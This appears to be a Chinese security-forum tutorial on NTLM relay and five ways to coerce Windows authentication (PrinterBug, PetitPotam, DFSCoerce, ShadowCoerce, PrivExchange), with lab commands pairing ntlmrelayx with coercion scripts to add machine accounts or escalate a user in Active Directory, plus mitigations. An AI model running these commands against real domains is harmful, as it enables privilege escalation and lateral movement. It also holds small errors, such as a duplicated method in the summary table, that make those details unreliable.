一、NTLM Relay 概述
---------------

NTLM Relay 基于 NTLM 协议，而 NTLM 认证信息作为”独立部分“会被嵌入到应用协议的数据包中，如SMB、HTTP、LDAP、MSSQL等。此外可以实现跨协议Relay，如通过某个协议（如HTTP）在另一个协议（如SMB）上转发LM或NTLM认证信息

NTLM Relay Attack（NTLM中继攻击）指的是强制目标服务器、目标用户使用LM Hash、NTLM Hash对攻击者的服务器进行认证，攻击者将该认证中继至其他目标服务器中（域控等），根据目标域的防护等级可以在活动目录域中进行横向移动或权限提升。流程可见下图  
![x1NOHK.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-ac20759ed0b452c36b47c71df43bf6b8c83e23d0.png)

关于 NLTM Relay 可见[此文](https://en.hackndo.com/ntlm-relay/)

本文着重探讨强制触发认证的方式，主要有以下几种：

- PrinterBug
- PeitiPotam
- DFSCoerce
- ShadowCoerce
- PrivExchange

二、强制触发认证的五种方式
-------------

### 01 PrinterBug

> MS-RPRN  
> RpcRemoteFindFirstPrinterChangeNotificationEx()

#### 攻击原理

通过触发 SpoolService 错误，强制目标通过 MS-RPRN RPC 接口向攻击者进行身份验证。  
MS-RPRN 协议中定义的 `RpcRemoteFindFirstPrinterChangeNotificationEx()` 方法允许域用户创建远程更改通知对象，该对象用于监视打印机对象的更改，并且在发生修改后会向打印客户端发送更改通知，这里的打印客户端指的就是攻击者的主机，用于接收目标发送的更改通知（NTLM 认证请求）

简而言之，就是通过触发打印机错误实现强制NTLM认证。

条件：

- 打印服务开启 - spoolsv.exe
- 拥有一个域用户凭据信息

#### 攻击流程&amp;相关工具

工具地址 - [SpoolSample](https://github.com/leechristensen/SpoolSample)

实验测试：  
本实验用于验证打印机触发远程验证的漏洞。  
简单起见，结合 ntlmrelay.py 工具通过执行添加用户的操作来验证 printbug 中继攻击成功与否

> 环境简介  
> 域名 - hack.lab  
> 域控 - DC01 - 20.20.20.5  
> 辅域 - F2016 - 20.20.20.6  
> 域主机 - USER01 - 20.20.20.10  
> Kali - 20.20.20.100

1. 开启监听器 ntlmrelay.py  
    选择添加用户参数 --add-computer  
    由于要中继到 ldaps 服务上，添加消除 mic 验证参数 --remove-mic（具体原理见后续文章）
    
    ```shell
    python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest$ --remove-mic
    ```
2. 使用 printerbug 漏洞利用工具  
    printerbug.py 触发辅域控进行强制验证
    
    ```shell
    python3 printerbug.py hack.lab/spiderman:123.com@20.20.20.6 20.20.20.100
    ```
    
    PS：这里攻击辅域控是因为域控发起的验证不能中继回自身（相关细节见MS08-068），故这里对辅域控进行强制验证。

![x1NjAO.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-4aa8bbf734f99ce24f132394b769ef85cc2000b8.png)

3. 效果分析  
    可以看到ntlmrelay中执行的添加用户的操作成功执行了，进而验证了 PrintBug 强制触发认证攻击成功。

#### 防御措施

- 非必要不启用 Print Spooler 服务
- 限制出入站的 NTLM 认证
- 打微软官方补丁

### 02 PeitiPotam

> MS-EFSR  
> \\PIPE\\lsarpc  
> EfsRpcOpenFileRaw()

#### 攻击原理

在微软加密文件系统远程协议（`Microsoft Encrypting File System Remote Protocol, MS-EFSRPC`）中，提供了 EfsRpcOpenFileRaw() 接口，该 API 用于维护和管理远程网络访问的加密对象。  
攻击者使用 MS-EFSRPC 协议连接到服务器，通过修改EfsRpcOpenFileRaw() 中的 FileName 参数劫持认证会话，迫使服务器进行强制验证。

简而言之，劫持目标函数中的FileName参数触发强制认证。

条件：

- 目标支持 MS-EFSR 协议
- 拥有一个域用户凭据信息

#### 攻击流程&amp;相关工具

工具地址 - [PetitPotam](https://github.com/topotam/PetitPotam)

实验测试：

> 环境简介  
> 域名 - hack.lab  
> 域控 - DC01 - 20.20.20.5  
> 辅域 - F2016 - 20.20.20.6  
> 域主机 - USER01 - 20.20.20.10  
> Kali - 20.20.20.100

1. 启动监听器 ntlmrelay.py  
    这里和上面一样，也是通过添加用户来验证 PeitiPotam 强制验证成功与否。
    
    ```shell
    python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest01$ --remove-mic
    ```
2. 利用工具触发认证  
    使用 PeitiPotam 利用工具进行强制触发认证，也是以辅域控为目标
    
    ```shell
    python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.6
    ```

![x1NLB6.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-2716bfef0142ca405d67ea759c26adb0ce2084bc.png)

3. 效果分析  
    可以看到ntlmrelay中执行的添加用户的操作成功执行了，进而验证了 PetitPotam 强制触发认证攻击成功。

#### 防御措施

- 删除不必要的角色服务
- 限制出入站的 NTLM 认证
- 打微软补丁

参考：[NTLM relay attacks explained, and why PetitPotam is the most dangerous | CSO Online](https://www.csoonline.com/article/3632090/ntlm-relay-attacks-explained-and-why-petitpotam-is-the-most-dangerous.html)

### 03 DFSCoerce

> CVE-2022-26925  
> MS-DFSNM  
> \\pipe\\netdfs  
> NetrDfsRemoveStdRoot() - NetrDfsAddStdRoot()

#### 攻击原理

在微软分布式文件系统命名空间管理协议[MS-DFSNM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) 中，提供了一个管理DFS配置的RPC接口，该接口可通过 `\pipe\netdfs` SMB命名管道获得。  
攻击者使用 MS-EFSRPC 协议中的RPC接口来触发强制认证，目前发现的特定方法有两个：NetrDfsRemoveStdRoot() 和 NetrDfsAddStdRoot()

条件

- 域内启用 MS-DFSNM 协议
- 拥有一个域用户凭据信息
- 只对域控有效

#### 攻击流程&amp;相关工具

工具地址 - [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)

实验环境：

> 环境简介  
> 域名 - hack.lab  
> 域控 - DC01 - 20.20.20.5  
> 辅域 - F2016 - 20.20.20.6  
> 域主机 - USER01 - 20.20.20.10  
> Kali - 20.20.20.100

1. 开启监听器 ntlmrelay.py  
    通过添加用户来验证 PeitiPotam 强制验证成功与否。
    
    ```shell
    python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest02$ --remove-mic
    ```
2. 使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证
    
    ```shell
    python3 dfscoerce.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
    ```

![x1Nqnx.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-9aaf771fc114889cad241c8196fedb48d2d0387e.png)

3. 效果分析  
    可以看到ntlmrelay中执行的添加用户的操作成功执行了，进而验证了 DFSCoerce 强制触发认证攻击成功。

#### 缓解措施

- 禁用已废弃的NTLM认证
- 启用身份验证扩展保护 (EPA)、SMB 签名
- 关闭 AD CS 服务器上的 HTTP 保护
- 打微软补丁 CVE-2022-26925

### 04 ShadowCoerce

> CVE-2022-30154  
> MS-FSRVP  
> \\pipe\\FssagentRpc  
> IsPathSupported() - IsPathShadowCopied()

#### 攻击原理

MS-FSRVP 是微软的文件服务器远程VSS协议。用于在远程计算机上创建文件共享卷影副本，该协议提供的接口可通过 `\pipe\FssagentRpc` SMB命名管道获得。  
攻击者通过使用一种依赖于远程UNC路径的特定方法来实现强制验证 —— IsPathSupported() 和 IsPathShadowCopied()

条件

- 目标服务器安装了文件服务器VSS代理服务
- 开启MS-FSRVP协议
- 拥有一个域用户凭据信息

#### 实验环境配置

实验环境：

> 环境简介  
> 域名 - hack.lab  
> 域控 - DC01 - 20.20.20.5  
> 辅域 - F2016 - 20.20.20.6  
> 域主机 - USER01 - 20.20.20.10  
> Kali - 20.20.20.100

除此之外，需要在目标服务器上启用 文件服务器VSS代理服务  
![x1NHj1.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-7dd9c612f3b0c02ac32f4a1351d9702c0f43e338.png)

#### 攻击流程&amp;相关工具

工具地址 - [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)

1. 开启监听器 ntlmrelayx ，这里也同样使用添加机器账户用于确认强制验证成功与否
    
    ```shell
    python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest03$ --remove-mic
    ```
2. 使用 shadowcoerce 脚本利用工具，触发强制验证
    
    ```shell
    python3 shadowcoerce.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
    ```

![x1Nx4e.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-ea0e27833362f87de3bb5e7c73eaff05c4772df0.png)

3. 效果分析  
    可以看到ntlmrelay中执行的添加用户的操作成功执行了，进而验证了 shadowcoerce 强制触发认证攻击成功。

#### 防御措施

- 限制出入站的 NTLM 认证
- 使用认证的扩展保护（EPA）
- 打补丁 CVE-2022-30154

### 05 PrivExchange

#### 攻击原理

在Exchange中，提供了网络服务API - PushSubscription，允许订阅推送通知。Exchange服务器在域中通常有很高的权限（WriteDacl，修改目标ACL的权限），是攻击的不戳目标。

攻击者可以利用该API迫使Exchange服务器对指定目标进行强制认证。

条件：

- 目标为Exchange，且未打补丁
- 拥有一个带有邮箱的域用户凭据信息

#### 攻击流程&amp;相关工具

工具地址 - [PrivExchange](https://github.com/dirkjanm/privexchange/)

实验测试：

> 环境简介  
> 域名 - hack.lab  
> 域控 - DC01 - 20.20.20.5  
> Exchange服务器 - E2016 - 20.20.20.7  
> 域主机 - USER01 - 20.20.20.10  
> Kali - 20.20.20.100

```shell
python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --escalate-user spiderman

python3 privexchange.py -u spiderman -p 123.com -d hack.lab -ah 20.20.20.100 20.20.20.7
```

#### 缓解措施

- 删除Exchange上的高权限用户
- 启用 LDAP 签名，开启 LDAP 通道绑定
- 打微软补丁

三、集成工具推荐 - Coercer
------------------

Coercer 是一款集成多种方法对目标服务器进行强制验证的python脚本  
工具地址 - [Coercer](https://github.com/p0dalirius/Coercer)

### 工具安装

```shell
git clone https://github.com/p0dalirius/Coercer
python3 -m pip install coercer
```

### 工具使用

分析目标服务器可利用的接口，使用 --analyze 参数

```shell
python3 Coercer.py -u spiderman -p 123.com -d hack.lab -l 20.20.20.100 -t 20.20.20.6 --analyze
```

PS：加 -v 可以显示更加详细的信息

![x1NvND.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-a84a9fadf7dde172a609ff24573e979def4b49e2.png)

执行强制验证攻击，默认先使用了 MS-EFSR::EfsRpcOpenFileRaw 方法

```shell
python3 Coercer.py -u spiderman -p 123.com -d hack.lab -l 20.20.20.100 -t 20.20.20.6
```

![x1US9H.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-6c3298060f40a5c26306e3caece6cddffa4e9078.png)

四、总结
----

本文介绍了5种强制验证的思路，下面将其进行对比汇总成一个表格

| Coerce | SMB named pipe | Protocol | API / Methods |
|---|---|---|---|
| PrinterBug | \\PIPE\\spoolss | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx |
| PeitiPotam | \\PIPE\\lsarpc | MS-EFSR | EfsRpcOpenFileRaw EfsRpcEncryptFileSrv EfsRpcDecryptFileSrv EfsRpcQueryUsersOnFile EfsRpcQueryRecoveryAgents EfsRpcFileKeyInfo |
| DFSCoerce | \\pipe\\netdfs | MS-DFSNM | NetrDfsRemoveStdRoot NetrDfsAddStdRoot |
| ShadowCoerce | \\pipe\\FssagentRpc | MS-FSRVP | IsPathSupported IsPathSupported |
| PrivExchange |  |  | PushSubscription |